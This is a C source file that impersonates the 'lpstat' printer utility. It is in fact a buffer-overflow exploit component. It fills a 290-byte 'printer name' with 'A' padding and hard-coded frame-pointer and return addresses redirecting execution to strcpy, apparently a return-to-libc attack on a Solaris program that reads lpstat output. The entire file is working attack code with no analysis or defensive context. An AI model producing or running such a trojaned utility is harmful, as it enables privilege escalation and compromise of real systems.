#include <stdio.h>
#define SIZE 290


void
usage()
{
 fprintf(stderr,"called with no arguments\n");
 exit(-1);
}

int 
main(int argc,char **argv) {
 
char name[SIZE];   /* printer name */ 

memset(name,0x00,sizeof(name)); /*clear with zeros*/
memset(name,0x41,SIZE);

/* 
 point to 0's for cont of exec 0xffbe31e8
*/ 
name[244]=0xff;
name[245]=0xbe;
name[246]=0x31;
name[247]=0xe8;


/* frame pointer 0xffbef1e8 (double word aligned 0x43 FRM)  
   this is the first time i set fp  
   1st  reg i set  0xffbef5e8
*/  
name[268]=0xff;
name[269]=0xbe;
name[270]=0xf5;
name[271]=0xe8;


/* pc to strcpy (0xfecb69e4) */
name[272]=0xfe;
name[273]=0xcb;
name[274]=0x69;
name[275]=0xe4;


name[SIZE-1]=0;

if(argc<2) {
  usage();
}

if(!strcmp(argv[1],"-v"))
{
   fprintf(stderr,"lpstat called with -v\n");
   printf("device for %s: /dev/null\n",name);
}
else
{
   fprintf(stderr,"lpstat called with -d\n");
   printf("system default destination: %s\n",name);
}

}
